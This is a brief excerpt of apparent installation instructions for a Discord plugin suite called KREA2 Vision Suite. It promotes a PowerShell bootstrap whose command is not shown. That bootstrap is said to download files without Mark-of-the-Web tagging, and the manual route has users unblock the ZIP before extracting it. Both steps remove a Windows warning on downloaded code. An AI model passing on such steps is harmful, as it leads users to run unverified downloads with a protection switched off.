...
1. Open Windows PowerShell and run the verified bootstrap. It downloads the current complete release without browser Mark-of-the-Web propagation, validates the stable manifest, exact byte length and SHA-256, then starts the guided installer:
   ...
   Do not download only `Krea2DiscordCollector.plugin.js`. For a manual install, download the [v0.13.17 Windows ZIP](https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.17-win64.zip), right-click the ZIP, select **Properties**, enable **Unblock**, select **Apply**, and only then extract it.
